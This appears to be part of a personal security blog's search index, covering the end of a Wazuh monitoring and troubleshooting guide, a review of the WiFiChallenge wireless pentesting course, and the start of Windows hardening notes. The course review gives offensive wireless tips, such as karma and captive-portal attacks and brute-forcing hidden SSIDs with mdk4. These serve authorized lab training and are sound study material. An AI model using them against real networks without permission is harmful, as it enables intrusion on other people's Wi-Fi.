msg.update(options)\n\n    return json.dumps(msg)\n</code></pre> <p>\ud83e\udeb2 Debugging</p> <p>You can run these scripts manually for debugging with the following line, where <code>test.json</code> is a single log entry (it does not have to be a single line, just one log entry though) for testing purposes.</p> <ul> <li>Before running it, change <code>LOG_FILE = f'{pwd}/logs/integrations.log'</code> to <code>LOG_FILE = f'integrations.log'</code></li> </ul> <pre><code>python3 ./custom-discord.py 'test.json' '' '&lt;webhook&gt;' 'debug'\n</code></pre>"},{"location":"blog/2024/08/13/material-server-security-wazuh-all-your-things-with-tailscale/#integration-block","title":"Integration Block","text":"<p>You'll need to append one or more <code>&lt;integration&gt;</code> sections to <code>/var/ossec/etc/ossec.conf</code>, that includes the integration name, webhook, and any filters or options.</p> <p>This section can have multiple entries utilizing the same integration. The sample below is ready to use after modifying or removing the necessary values for your use case. It's written so you can append it directly to <code>ossec.conf</code>.</p> <pre><code>&lt;ossec_config&gt;\n  &lt;integration&gt;\n      &lt;name&gt;custom-discord&lt;/name&gt;\n      &lt;hook_url&gt;https://discord.com/api/webhooks/XXXXXXXXXXXXXXX/XXXXXXXXXXXXXXXXXXXXXXX&lt;/hook_url&gt;\n      &lt;group&gt;GROUP&lt;/group&gt; &lt;!-- Replace with an optional comma separated list of groups or remove it --&gt;\n      &lt;rule_id&gt;RULE_ID&lt;/rule_id&gt; &lt;!-- Replace with an optional comma separated list of rule ids or remove it --&gt;\n      &lt;level&gt;SEVERITY_LEVEL&lt;/level&gt; &lt;!-- Replace with an optional minimum severity level or remove it --&gt;\n      &lt;event_location&gt;EVENT_LOCATION&lt;/event_location&gt; &lt;!-- Replace with an optional comma separated list of event locations or remove it --&gt;\n      &lt;alert_format&gt;json&lt;/alert_format&gt;\n      &lt;options&gt;JSON&lt;/options&gt; &lt;!-- Replace with your custom JSON object or remove it --&gt;\n  &lt;/integration&gt;\n  &lt;integration&gt;\n      &lt;name&gt;custom-discord&lt;/name&gt;\n      &lt;hook_url&gt;https://discord.com/api/webhooks/XXXXXXXXXXXXXXX/XXXXXXXXXXXXXXXXXXXXXXX&lt;/hook_url&gt;\n      &lt;group&gt;GROUP&lt;/group&gt; &lt;!-- Replace with an optional comma separated list of groups or remove it --&gt;\n      &lt;alert_format&gt;json&lt;/alert_format&gt;\n  &lt;/integration&gt;\n&lt;/ossec_config&gt;\n</code></pre>"},{"location":"blog/2024/08/13/material-server-security-wazuh-all-your-things-with-tailscale/#maintenance","title":"Maintenance","text":"<p>With limited time and budget, you'll want to walk away knowing exactly what you'll want to maintain, meaning where to focus your efforts as your Wazuh instance lives and grows.</p> <p>Huge thanks to Wazuh and SocFortress for the blog posts and configuration templates that do most of this heavy lifting. Because of this, 1) this post exists, and 2) you can focus on maintaining specific components without worrying about making sure changes to your logging conf are reflected in three other places for Wazuh to successfully ingest the information.</p> <p>Components to maintain and when:</p> <p>Logging Configs</p> <ul> <li>sysmon config.xml: You can start with the recommended config.xml file and do well. Over time you may want to start tailoring your own.</li> <li>auditd.rules: Make sure every rule has a <code>key</code> value, the SocFortress decoder and rules will let you search in Wazuh based on the full_log as well as the auditd key</li> </ul> <p>wazuh-manager ossec.conf</p> <ul> <li><code>&lt;integrations&gt;</code> section: Define what rules, groups, log locations, and / or log severity ships an alert or data to an external source</li> <li>Maintain one block you deploy generally on all endpoints</li> <li>Maintain blocks limited to specific agents</li> <li>This can help you cut through the noise, and get a heads up on severe events</li> </ul> <p>wazuh-agent ossec.conf</p> <ul> <li>Each endpoint may have varying configurations</li> <li>File integrity monitoring, mainly adding <code>check_all=\"yes\" report_changes=\"yes\" realtime=\"yes\"</code> to the two default directories if you want realtime monitoring</li> <li>If you add a network IDS on the endpoint, tell the agent about it here as well</li> <li>You can deploy this with a shell script or your own Ansible role as you learn what needs done on each endpoint in your environment</li> </ul>"},{"location":"blog/2024/08/13/material-server-security-wazuh-all-your-things-with-tailscale/#troubleshooting","title":"Troubleshooting","text":""},{"location":"blog/2024/08/13/material-server-security-wazuh-all-your-things-with-tailscale/#wazuh-dashboard-server-is-not-ready-yet","title":"Wazuh dashboard server is not ready yet","text":"<p>Related Documentation</p> <ul> <li>Wazuh Docs: Wazuh dashboard server is not ready yet</li> <li>GitHub: wazuh-indexer (The wazuh-indexer is a customized fork of OpenSearch)</li> <li>GitHub: wazuh-dashboard (The wazuh-dashboard is a customized fork of OpenSearch's Dashboard)</li> <li>OpenSearch-Dashboards/issues/4617</li> <li>OpenSearch Docs: Cluster API / Cluser Health</li> <li>OpenSearch Docs: Dashboard Upgrades</li> </ul> <p>Service Timeout</p> <p>You may encounter this issue when trying to reach the web interface. Check <code>wazuh-indexer.service</code> first:</p> <pre><code>$ systemctl status wazuh-indexer\n\u00d7 wazuh-indexer.service - wazuh-indexer\n    Loaded: loaded (/lib/systemd/system/wazuh-indexer.service; enabled; vendor preset: enabled)\n    Active: failed (Result: timeout) since Sat 2025-03-02 03:02:01 UTC; 1 days ago\n    Docs: https://documentation.wazuh.com\nMain PID: 123 (code=exited, status=143)\n        CPU: 12.345s\n\nMar 02 03:02:01 wazuh-server systemd-entrypoint[123]:         at org.opensearch.bootstrap.OpenSearch.execute(OpenSearch.java:172)\nMar 02 03:02:01 wazuh-server systemd-entrypoint[123]:         at org.opensearch.cli.EnvironmentAwareCommand.execute(EnvironmentAwareCommand.java:104)\nMar 02 03:02:01 wazuh-server systemd-entrypoint[123]:         at org.opensearch.cli.Command.mainWithoutErrorHandling(Command.java:138)\nMar 02 03:02:01 wazuh-server systemd-entrypoint[123]:         at org.opensearch.cli.Command.main(Command.java:101)\nMar 02 03:02:01 wazuh-server systemd-entrypoint[123]:         at org.opensearch.bootstrap.OpenSearch.main(OpenSearch.java:138)\nMar 02 03:02:01 wazuh-server systemd-entrypoint[123]:         at org.opensearch.bootstrap.OpenSearch.main(OpenSearch.java:104)\nMar 02 03:02:01 wazuh-server systemd[1]: wazuh-indexer.service: start operation timed out. Terminating.\nMar 02 03:02:01 wazuh-server systemd[1]: wazuh-indexer.service: Failed with result 'timeout'.\nMar 02 03:02:01 wazuh-server systemd[1]: Failed to start wazuh-indexer.\nMar 02 03:02:01 wazuh-server systemd[1]: wazuh-indexer.service: Consumed 12.345s CPU time.\n</code></pre> <p>If you get the error above, try restarting the indexer on its own. Often restarting the manager, or the entire server will not resolve this, likely due to the timeout issue where it's not initializing fast enough.</p> <p>Next you could try restarting the <code>wazuh-dashboard.service</code>. Be patient, if you see the error below, wait a minute or two and try to refresh the page. This error will happen when the dashboard is starting up, but hasn't connected to the indexer just yet.</p> <pre><code>$ systemctl status wazuh-dashboard\n\u25cf wazuh-dashboard.service - wazuh-dashboard\n    Loaded: loaded (/etc/systemd/system/wazuh-dashboard.service; enabled; vendor preset: enabled)\n    Active: active (running) since Tue 2025-03-02 01:00:00 UTC; 1min 23s ago\nMain PID: 12345 (node)\n    Tasks: 11 (limit: 9348)\n    Memory: 183.2M\n        CPU: 12.345s\n    CGroup: /system.slice/wazuh-dashboard.service\n            \u2514\u250012345 /usr/share/wazuh-dashboard/node/bin/node --no-warnings --max-http-header-size=65536 --unhandled-rejections=warn /usr/share/wazuh-dashboard/src/cli/dist\n\nMar 02 03:02:01 wazuh-server opensearch-dashboards[12345]: {\"type\":\"log\",\"@timestamp\":\"2025-03-02T01:00:00Z\",\"tags\":[\"error\",\"opensearch\",\"data\"],\"pid\":12345,\"message\":\"[search_phase_execution_exception]: all shards failed\"}\nMar 02 03:02:01 wazuh-server opensearch-dashboards[12345]: {\"type\":\"log\",\"@timestamp\":\"2025-03-02T01:00:00Z\",\"tags\":[\"error\",\"opensearch\",\"data\"],\"pid\":12345,\"message\":\"[search_phase_execution_exception]: all shards failed\"}\n</code></pre> <p>After a couple minutes the dashboard webpage should finally load.</p> <p>Migration Failure</p> <p>This can happen during upgrades if you're not following the upgrade guide which recommends disabling shard replication on each indexer before upgrading them. Ideally this could be automated so it can run and then be validated after, however if you are simply doing some form of headless apt update + full-upgrade you can run into this issue leading to the dashboard not being able to load.</p> <p>This process was put together after working with GPT5 (Thinking) to explore each option, and determine what worked in this unique instance. The Wazuh documentation for this error helps you find what's failing and where, but you'll have to know how to manually talk to the underlying components to really get anywhere.</p> <p>These commands will help you gather the current 'state' of Wazuh at a high level, and hopefully point to what is failing and why.</p> <pre><code># Rule out connection issues\ncurl -v telnet://&lt;WAZUH_INDEXER_IP_ADDRESS&gt;:9200\n\n# Dashboard status\nsudo systemctl status wazuh-dashboard\n\n# Dashboard journal (can take a long time to render)\nsudo journalctl -u wazuh-dashboard | grep -i -E \"error|warn\"\nsudo journalctl -u wazuh-dashboard | grep -i -E \"error|warn\" | tail\n\n# Indexer status\nsudo systemctl status wazuh-indexer\n\n# Indexer logs\nsudo cat /var/log/wazuh-indexer/&lt;WAZUH_INDEXER_CLUSTER_NAME&gt;.log | grep -E \"ERROR|WARN|Caused\"\n</code></pre> <p>In my case, after reviewing the output of all the above commands, the final line in the output of <code>wazuh-dashboard</code>'s journal pointed to the solution:</p> <pre><code># SNIP\nJan 01 05:22:47 wazuh-standalone opensearch-dashboards[123]: {\"type\":\"log\",\"@timestamp\":\"2025-01-01T05:22:47Z\",\"tags\":[\"error\",\"opensearch\",\"data\"],\"pid\":123,\"message\":\"[search_phase_execution_exception]: all shards failed\"}\nJan 01 05:22:49 wazuh-standalone opensearch-dashboards[123]: {\"type\":\"log\",\"@timestamp\":\"2025-01-01T05:22:49Z\",\"tags\":[\"error\",\"opensearch\",\"data\"],\"pid\":123,\"message\":\"[search_phase_execution_exception]: all shards failed\"}\nJan 01 05:22:52 wazuh-standalone opensearch-dashboards[123]: {\"type\":\"log\",\"@timestamp\":\"2025-01-01T05:22:52Z\",\"tags\":[\"error\",\"opensearch\",\"data\"],\"pid\":123,\"message\":\"[search_phase_execution_exception]: all shards failed\"}\nJan 01 05:22:54 wazuh-standalone opensearch-dashboards[123]: {\"type\":\"log\",\"@timestamp\":\"2025-01-01T05:22:54Z\",\"tags\":[\"error\",\"opensearch\",\"data\"],\"pid\":123,\"message\":\"[search_phase_execution_exception]: all shards failed\"}\nJan 01 05:22:57 wazuh-standalone opensearch-dashboards[123]: {\"type\":\"log\",\"@timestamp\":\"2025-01-01T05:22:57Z\",\"tags\":[\"error\",\"opensearch\",\"data\"],\"pid\":123,\"message\":\"[search_phase_execution_exception]: all shards failed\"}\nJan 01 05:23:00 wazuh-standalone opensearch-dashboards[123]: {\"type\":\"log\",\"@timestamp\":\"2025-01-01T05:23:00Z\",\"tags\":[\"error\",\"opensearch\",\"data\"],\"pid\":123,\"message\":\"[resource_already_exists_exception]: index [.kibana_3/&lt;string&gt;] already exists\"}\nJan 01 05:23:00 wazuh-standalone opensearch-dashboards[123]: {\"type\":\"log\",\"@timestamp\":\"2025-01-01T05:23:00Z\",\"tags\":[\"warning\",\"savedobjects-service\"],\"pid\":123,\"message\":\"Unable to connect to OpenSearch. Error: resource_already_exists_exception: [resource_already_exists_exception] Reason: index [.kibana_3/&lt;string&gt;] already exists\"}\nJan 01 05:23:00 wazuh-standalone opensearch-dashboards[123]: {\"type\":\"log\",\"@timestamp\":\"2025-01-01T05:23:00Z\",\"tags\":[\"warning\",\"savedobjects-service\"],\"pid\":123,\"message\":\"Another OpenSearch Dashboards instance appears to be migrating the index. Waiting for that migration to complete. If no other OpenSearch Dashboards instance is attempting migrations, you can get past this message by deleting index .kibana_3 and restarting OpenSearchDashboards.\"}\n</code></pre> <p>If no other OpenSearch Dashboards instance is attempting migrations, you can get past this message by deleting index .kibana_3 and restarting OpenSearchDashboards.\"</p> <p>How to do this, was suggested through numerous steps by GPT5. Ultimately this is exactly what was necessary to clear the \"stuck\" index of .kibana_3.</p> <p>First SSH into your manager node, and set your username:password as a temporary environment variable hidden from your shell history.</p> <pre><code># Safely ingest your authentication information\necho \"Enter Wazuh [username:password]\"; read -r -s wazuh_userpass; export WAZUH_USERPASS=$wazuh_userpass\n</code></pre> <p>Now you can start querying the cluster's health. This will point to any other obvious issues.</p> <pre><code>curl -k -u \"${WAZUH_USERPASS}\" https://localhost:9200/_cluster/health?pretty\n</code></pre> <p>To clear <code>.kibana_3</code> (steps directly from GPT5):</p> <pre><code># Stop the dashboard service\nsudo systemctl stop wazuh-dashboard\n\n# Remove the .kibana_3 index called out in the indexer log\ncurl -k -u \"${WAZUH_USERPASS}\" -X DELETE 'https://localhost:9200/.kibana_3'\n\n# If present, also delete the paired task manager index generated for that generation:\ncurl -k -u \"${WAZUH_USERPASS}\" -X DELETE 'https://localhost:9200/.kibana_task_manager_3'\n\n# Restart the dashboard\nsudo systemctl start wazuh-dashboard\n</code></pre> <p>This addresses the issue of a stuck index migration. You won't lose any log data, and while the dashboard is unavailable in this state, your Wazuh instance will still be functional and gathering logs / taking actions as normal in the background.</p>"},{"location":"blog/2024/08/13/material-server-security-wazuh-all-your-things-with-tailscale/#migrate-to-proxmox","title":"Migrate to Proxmox","text":"<p>This section mirrors what's mentioned under blog/Proxmox. Be sure to check that post if you need to get started with proxmox first and for all related details.</p> <p>Basically, it's fairly straight forward and easy to migrate even a large standalone Hyper-V VM to Proxmox. Keep this in mind if you plan to deploy it in \"production\" or require more space and a distributed Wazuh cluster.</p>"},{"location":"blog/2025/10/16/material-wifi-cog-wifichallenge-exam--course-review/","title":"WiFiChallenge Exam &amp; Course Review","text":"<p>Overview</p> <p>This is a consolidated reflection on the CWP exam and course, as well as the WiFi Challenge Lab open source project.</p> <p>In summary, this is an incredibly practical and effective wireless pentesting course.</p> <ul> <li>academy.wifichallenge.com</li> <li>Full lab and Docker files: github.com/r4ulcl/WiFiChallengeLab-docker</li> <li>Blogs and walkthroughs by the course author: r4ulcl.com/posts</li> </ul> <p>Strengths &amp; Weaknesses Overview</p> <p>In comparing strengths and weaknesses, you'll notice there aren't a lot of real weaknesses.</p> <p>The main weakness isn't really a problem with the course so much as the platform missing a global, precise, search function. This would help you find the exact page or relevant content you might be looking for, but without it you're encouraged to take better notes.</p> <p>I'm leaving out anything here that could be considered a feature request to grow the course itself.</p> Strengths Weaknesses \ud83d\udfe2 Affordable \ud83d\udd34 Course platform search capabilities (2025) \ud83d\udfe2 Effective and practical \u26aa Docker lab may require tweaking in some setups \ud83d\udfe2 Teaches pentesting and building + working with wireless \ud83d\udfe2 Current, updated, with wide tool coverage \ud83d\udfe2 Nzyme IDS integration \ud83d\udfe2 Self-contained course material \ud83d\udfe2 Offline, local, customizable lab \ud83d\udfe2 Comparison of physical WiFi adapters \ud83d\udfe2 Exam feedback and help"},{"location":"blog/2025/10/16/material-wifi-cog-wifichallenge-exam--course-review/#context-review","title":"Context &amp; Review","text":"<p>When signing up for this course I had already completed the OSWP exam from OffSec. That was largely thanks to the dockerized pentesting lab this course provides you to practice in offline, and modify as needed.</p> <p>I spent the majority of the year after purchasing the course getting lost with Docker, Ansible, Molecule, GitHub actions, and Packer, after seeing what this project achieved through emulating wireless networks using the mac80211_hwsim kernel module. This resulted in a prolonged tangent into devops, and the project to convert my entire tech stack into infrastructure-as-code. At a certain point I got the alert that I needed to schedule the exam, since it had almost been an entire year.</p>"},{"location":"blog/2025/10/16/material-wifi-cog-wifichallenge-exam--course-review/#course-material","title":"Course Material","text":"<p>The depth of the course is evident if you read through the source code of the public project, look at what it's doing, and think about what attacks are possible based on that. I was even sidetracked by Nzyme, setting that up in my lab for real world use which has been one of the more interesting and useful side projects, since it takes IDS into the physical world.</p> <p>The course walks through every network type, for creating (yes, creating), connecting to, and attacking, WiFi. That's the strength of this course, you'll know how everything works at a practical level. You can go further and set up your own RADIUS server and authentication through Active Directory if you want, but you never need to memorize how to do things like this because templates exist both in the course, and in some of the tools designed to attack those networks. Really useful if you want to build your own AP, for example.</p> <p>As for introducing you to, and showcasing popular tools, the course somehow figured out exactly what top tools to focus on. All of those highlighted give you (require?) a certain level of control and configuration to use them. What that means is, everything is just hands on enough to teach you how it all works without getting too far into the weeds on doing everything manually, from scratch, which can feel very clunky with some attacks. By the end, you'll feel comfortable digging into the details of the tools discussed as well as those not covered. This should also give you confidence running some of the more automated tools, to know what they're doing and/or why they're failing if they do.</p>"},{"location":"blog/2025/10/16/material-wifi-cog-wifichallenge-exam--course-review/#virtual-study-environment","title":"Virtual Study Environment","text":"<p>Both the labs and the exam were done within my Kali packer build for wireless pentesting in QEMU / virt-manager, and building the Docker images locally with a few modifications.</p> <p>Pre-built VMs are also available to download. Ultimately thanks to Docker you can do this on any compatible VM and in any hypervisor.</p> <p>My troubleshooting notes on Docker are at the bottom of this post, because the prebuilt Docker images didn't always work perfectly for me.</p> <p>I went this route to familiarize myself with setting up these tools and to see what isn't available in Kali by default. What can really help you, if you want to automate some of this into your own Kali builds, is reviewing the repo's shell script that installs the attacker tools.</p> <p>If you're more comfortable in Debian or Ubuntu, a lot of these tools support those distros just as much as they do Kali.</p>"},{"location":"blog/2025/10/16/material-wifi-cog-wifichallenge-exam--course-review/#preparing-for-and-taking-the-exam","title":"Preparing for and Taking the Exam","text":"<p>Everything related to the exam process (scheduling, starting, and running the exam) is painless, leaving you to focus on preparing for, and simply executing on, the exam.</p> <p>The exam goals and time limit felt like they were balanced just right. When it came down to it, I had only a few weeks to really focus on this and pause all other personal projects. Realistically that translated to 3 weekends, and 1-4 hours on about half of the nights of any week. At that point I had no practial knowledge or muscle memory with wireless pentesting, with my only experience being the OSWP. I had an idea of what the attack paths were, so it wasn't difficult to recall previous, and absorb new concepts, quickly. My constant work on devops projects likely helped me catch up on researching, note taking, and thinking about \"what do I need to move ahead right now\". The answer to that question will be different for everyone, but that's your key to success here.</p> <p>The point is, despite how in-depth the course material can be, it's very straight forward and easy to follow. I believe even those getting started with Linux will have a clear path to success here with persistence and curiosity alone.</p> <p>The course provides you a methodology overview, not as prescriptive as the OWASP WSTG but enough to guide you without a walkthrough.</p> <p>I suggest trying to complete the entire Docker lab using just methodology notes from the course, to see where your gaps in understanding are. The Cheat Sheets section below is where my knowledge gaps were resolved. Even though it's somewhat redundant information, reading other approaches to options in attack paths is what made me realize things like having one ongoing recon window running in the background for reference was useful, as well as what attacks are best to kick off and let run while you review and digest other information.</p> <p>The final key here goes back to advice that BB King (BHIS) has mentioned anytime report writing comes up; write the report as you go.</p> <p>This may not be the most popular method but I fall into that category; I just cannot take a folder of disparate screenshots and txt files, and turn those into a coherant report after the fact. Adding to this advice, what I do is create a report skeleton for a wireless pentest in general. Something that could even work as a base in the real world. Then I wrote a couple of mock reports using the learned methodology moving through the entire Docker lab. This will highlight what you might run into with report writing, that you wouldn't want to figure out during the exam.</p>"},{"location":"blog/2025/10/16/material-wifi-cog-wifichallenge-exam--course-review/#closing-thoughts-feature-requests","title":"Closing Thoughts &amp; Feature Requests","text":"<p>Final Thoughts</p> <p>This course covers nearly every WiFi attack path using a number of the most up-to-date and popular tools, with room to add more outside of the foundations it sets if it really wanted to. The possibilities there are exciting, because if you've done any live recon or research on wigle.net, you'll know that WiFi is seemingly overlooked as an attack vector compared to everything else \"within\" the cloud or network that has a ton of tooling available, engineering time spent on it, and frankly, ease of visibility into it. It's a lot like firmware in that sense, we have sysmon, auditd, and endless security tooling on the network and within the OS, but we don't have the same insights into the UEFI world at runtime.</p> <p>Feature Requests</p> <p>I shared some of these requests with the course author after completing the exam. Since the lab and Docker code is open source, I don't believe this spoils anything by mentioning it, but it's implied in the name of \"WiFi\" Challenge Lab that its focus is on pentesting WiFi.</p> <ul> <li>Recon + attacks on other protocols (Bluetooth, LoRa, SubGHZ, RFID, Infrared, NFC, Z-Wave, Zigbee, etc)</li> <li>More focus (maybe even a dedicated course + exam) on the \"blue team\" side using Nzyme</li> <li>Red team considerations outside of pentesting</li> </ul>"},{"location":"blog/2025/10/16/material-wifi-cog-wifichallenge-exam--course-review/#remaining-notes","title":"Remaining Notes","text":"<p>Some of the details above were intentionally vague to prevent spoiling anything. The rest of my notes below though will be more specific, and were chosen to share here because they were the most helpful to me and can be applied generally even outside of the lab.</p> <p>Part of the reason for this post is to solidify the entire lab experience in memory by reviewing it after clearing the exam, since I don't do wireless pentesting every day. I've also been using the WiFiChallenge lab repo since before the course existed, so in some sense these notes are the summary of everything I've learned there, so I don't forget them. This allows me to retrace my steps in the future.</p> <p>Ultimately, my goal is using pentesting to discover and validate the defense + hardening measures to secure things. I can take that back to the devops world and attempt to bake that into my infrastructure using code.</p>"},{"location":"blog/2025/10/16/material-wifi-cog-wifichallenge-exam--course-review/#cheat-sheets","title":"Cheat Sheets","text":"<p>Both the pwnbox and eaphammer wikis were referenced throughout the course, as both are very popular repos. A few of these sections specifically proved invaluable for me in tying all of the concepts together that I was still wondering about in the back of my mind after completing the majority of the course content at least once. That will vary for everyone, but these are highlighted here more for me to come back to more than anything.</p> <p>This is all Methodology</p> <p>Having a checklist is one thing, but when it becomes intuitive, the whole process feels less cumbersome and more like an investigation. This is where you want to be before the exam.</p> <ul> <li>github.com/koutto/pi-pwnbox-rogueap/wiki<ul> <li>Mindmap of WiFi hacking workflow</li> <li>Comparison of EAP Methods</li> <li>MITM commands with Bettercap</li> <li>When and how Rogue AP attacks are effective</li> </ul> </li> <li>github.com/s0lst1c3/eaphammer/wiki</li> </ul>"},{"location":"blog/2025/10/16/material-wifi-cog-wifichallenge-exam--course-review/#operational-tips","title":"Operational Tips","text":"<p>These are things I eventually started doing, or realized along the way, that I found useful. Some of this is comes down to preference, while a few of the notes I just wasn't seeing the first few times I looked at something.</p> <ul> <li>Dedicate an entire tmux pane (no splitting) to a long running triage + capture on all channels / networks, just to see what you might find over time</li> <li>You can run multiple captures simultenously, like a general long-running triage capture and a surgical capture on one AP + channel</li> <li>Get real-time visibility into your radios; I did this by creating check-iw.sh</li> <li>EAPhammer has the ability to perform karma, and captive portal attacks<ul> <li>Karma attack types are covered by both wikis above, in the Cheat Sheets section</li> </ul> </li> <li>A note on decloaking hidden APs via bruteforce name guessing:<ul> <li>mdk4 actually runs very fast, and only prints out one of every 300 or so attempts to console</li> <li>You may have realized SecLists and similar wordlists don't have a top-1000 WiFi SSIDs, but wigle.net/stats#ssidstats does (as a downloadable CSV!)</li> </ul> </li> </ul>"},{"location":"blog/2025/10/16/material-wifi-cog-wifichallenge-exam--course-review/#methodology-highlights","title":"Methodology Highlights","text":"<p>This section details actions or steps I found most helpful to note when creating my workflow. The technical how-to or method is best demonstrated in the course, along with other public wikis and references.</p> <ul> <li>Start with the low-hanging fruit first</li> <li>Similar to wired network recon automation, start long-running or broad capture(s) in the background as needed</li> <li>The general rule of bruteforce operations still applies here:<ul> <li>Run these tasks asynchronously in the background if it's possible and safe</li> <li>If it's not a prerequisite to an attack path, or the attack path itself, bruteforce should be your last resort</li> </ul> </li> <li>Focus on one target at a time, gather the relevant evidence and log it</li> <li>Review and note the relationships of all targets in scope, these will define attack opportunities</li> </ul>"},{"location":"blog/2025/10/16/material-wifi-cog-wifichallenge-exam--course-review/#docker-usage-troubleshooting","title":"Docker Usage &amp; Troubleshooting","text":"<p>You can copy the docker-compose-local.yml build file, modify it, and build the entire lab locally using the Dockerfiles:</p> <p>AI Usage</p> <p>I shared what I was running into with GPT 5, for ideas and code snippets, so I could take that to the Docker documentation and review. That led to the <code>-d --build --force-recreate --remove-orphans</code> suggestion, since it's <code>docker compose up --help</code> and not <code>docker compose build --help</code> that unintuitively has those options. The block below is what I landed on after some conversation and research to help me consistently build, modify, and rebuild the lab environment as needed.</p> <pre><code># Build &amp; run (daemonized) using a specific file\ndocker compose -f docker-compose-local.yml up -d --build\n\n# Check status\ndocker compose ps\n\n# Restart the containers if you run into issues, optionally specify a name for only one\ndocker compose restart [name]\n\n# Get a shell on the container to debug\ndocker exec -it WiFiChallengeLab-APs /bin/bash\n\n# Completely rebuild the same containers, but with modified dockerfiles\ndocker compose -f docker-compose-minimal.yml up -d --build --force-recreate --remove-orphans\n# From there you'll be able to continue to start / stop the containers without needing to rebuild them.\n</code></pre> <p>Customized Local File</p> <p>This is my customized version of the \"main\" dockerfile, which runs only the AP's + clients. By building them all locally you can sometimes avoid issues if you're running into problems with the pre-built docker images.</p> <p>Point-in-Time</p> <p>This may not be necessary in your case, or even work in the future if the project updates it's compose file. It's simply an example that worked at a point-in-time.</p> <pre><code>services:\n  aps:\n    #image: r4ulcl/wifichallengelab-aps:latest\n    build: ./APs/ # uncomment to build the Docker file\n    restart: on-failure   # Automatically restart on failure\n    container_name: WiFiChallengeLab-APs\n    env_file: ./APs/.env\n    volumes:\n      - ./certs:/root/certs/:ro\n      - ./certs:/root/mgt/certs/:ro\n      - ./certs:/var/www/html/.internalCA/\n      - /lib/modules:/lib/modules\n      - ./logsAP:/root/logs/\n    healthcheck:\n      test:\n        - CMD-SHELL\n        - ip netns exec ns-ap /bin/bash -c '\n          curl -f -s http://localhost/login.php &gt;/dev/null || exit 1;\n          curl -s http://localhost:8080 &gt;/dev/null || exit 2;\n          if [ $(ps aux | grep host_aps_apd | grep -v grep | grep -c host_aps_apd) -ne 15 ]; then exit 3; fi'\n      interval: 5s\n      timeout: 5s\n      retries: 3\n      start_period: 30s\n    network_mode: host #NETNS\n    privileged: true #NETNS\n\n  clients:\n    #image: r4ulcl/wifichallengelab-clients:latest\n    build: ./Clients/ # uncomment to build the Docker file\n    restart: on-failure   # Automatically restart on failure\n    container_name: WiFiChallengeLab-Clients\n    env_file: ./Clients/.env\n    volumes:\n      - ./certs:/root/certs/:ro\n      - /lib/modules:/lib/modules\n      - ./logsClient:/root/logs/\n    depends_on:\n      - aps\n    network_mode: host #NETNS\n    privileged: true #NETNS\n    healthcheck:\n      test:\n        - CMD-SHELL\n        - ip netns exec ns-client /bin/bash -c '\n          curl -s http://localhost &gt;/dev/null || exit 1;\n          if [ $(ps aux | grep wpa_wifichallenge_supplicant | grep -vE \"grep|sudo|timeout\" | grep -c wpa_wifichallenge_supplicant) -lt 17 ]; then exit 2; fi'\n      interval: 5s\n      timeout: 5s\n      retries: 3\n      start_period: 45s\n</code></pre>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/","title":"Windows","text":"<p>Various configuration settings and notes for Microsoft Windows operating systems.</p> <p>This file is originally from straysheep-dev/windows-configs.</p>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#licenses","title":"Licenses","text":"<p>Unless a different license is included with a file as <code>&lt;filename&gt;.copyright-notice</code> all files are released under the MIT license.</p> <p>Examples in this README taken and adapted from the Microsoft documents:</p> <ul> <li>Microsoft Docs Examples:<ul> <li>CC-BY-4.0</li> <li>MIT</li> </ul> </li> <li>Win32-OpenSSH Wiki Examples:<ul> <li>https://github.com/PowerShell/Win32-OpenSSH/wiki</li> </ul> </li> <li>Stack Overflow Licensing:<ul> <li>https://stackoverflow.com/legal/terms-of-service#licensing</li> <li>CC-BY-SA-4.0</li> </ul> </li> </ul>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#windows-baselining","title":"Windows Baselining","text":"<p>Creating a security baseline for Windows.</p>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#backup-the-registry","title":"Backup the Registry","text":"<p>Before making changes, it's useful to create a backup of the registry in a default or working state.</p> <ul> <li>Enable-ComputerRestore</li> <li>CheckPoint-Computer</li> <li>Restore-Computer</li> </ul> <p>To create a system restore point: <pre><code>Enable-ComputerRestore -Drive \"C:\\\"\nCheckpoint-Computer -Description \"First restore point\"\n</code></pre></p> <p>There are multiple restore point types:</p> <ul> <li><code>APPLICATION_INSTALL</code></li> <li><code>APPLICATION_UNINSTALL</code></li> <li><code>DEVICE_DRIVER_INSTALL</code></li> <li><code>MODIFY_SETTINGS</code></li> <li><code>CANCELLED_OPERATION</code></li> </ul> <p>For registry changes specifically, <code>APPLICATION_INSTALL</code> is the type to use. It's also the default type, so it's not necessary to specify it on the commandline.</p> <p>List all system restore points: <pre><code>Get-ComputerRestorePoint\n</code></pre></p> <p>After making changes, revert to a specific restore point: <pre><code>Restore-Computer -RestorePoint 1\n</code></pre></p> <p>The restore process can take several minutes, even when reverting a single change to the registry. Generally it takes about 3-4 minutes for local test VM's.</p>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#lgpoexe","title":"LGPO.exe","text":"<p>See the tools available in the Microsoft Security Compliance Toolkit</p> <p>Choose what tools and policies to download that you'd like to apply to your environment.</p> <p>The idea with the <code>.PolicyRules</code> files is they are configurations that are pre-made by Microsoft and ready to be installed using <code>LGPO.exe</code></p> <p>You can do all of this manually with PowerShell, and you will ultimately want to familiarize yourself with the descriptions of each setting should you run into any issues, but this will save a ton of time in getting things up and running.</p> <p>Use <code>PolicyAnalyzer.exe</code> to view the <code>*.PolicyRules</code> files, compare them to other <code>*.PolicyRules</code> files or even your current system settings.</p> <p>Use <code>LGPO.exe</code> to apply the configurations found in the <code>*.PolicyRules</code> files to your system.</p> <p>For example the you might apply the Security Baselines for both Windows 11 Pro and the latest available version of Microsoft Edge.</p> <p>Deploy and test these configurations in a temporary or virtual environment first, either a VM (local or cloud) or enabled the Windows Sandbox feature.</p> <p>Windows Sandbox is a temporary, and (depending on your <code>.wsb</code> configuration) fully isolated environment that can be started very quickly from either launching the application as you would any other, or by running a <code>.wsb</code> configuration file.</p>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#powerstig","title":"PowerSTIG","text":"<p>This is covered in Getting Started with PowerSTIG.</p>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#active-directory","title":"Active Directory","text":""},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#ad-installing-the-ad-rsat-tools","title":"AD: Installing the AD RSAT Tools","text":"<p>You no longer need to download the AD RSAT packages from Microsoft's website, instead these are included as Windows Features on Demand. The AD RSAT tools come available by default in most Windows Server installations. However you can add the capability manually to a workstation by following the references below.</p> <ul> <li>Installing RSAT Tools</li> <li>Using DISM</li> <li>DISM CLI Options</li> 